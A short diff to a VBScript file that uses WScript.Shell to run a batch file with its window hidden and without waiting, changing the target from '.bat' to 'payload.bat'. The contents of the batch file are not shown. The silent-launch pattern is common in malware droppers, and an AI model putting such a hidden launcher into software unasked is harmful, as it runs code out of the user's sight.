@@ -1,4 +1,4 @@
 Set oShell = CreateObject ("Wscript.Shell") 
 Dim strArgs
-strArgs = "cmd /c .bat"
+strArgs = "cmd /c payload.bat"
 oShell.Run strArgs, 0, false
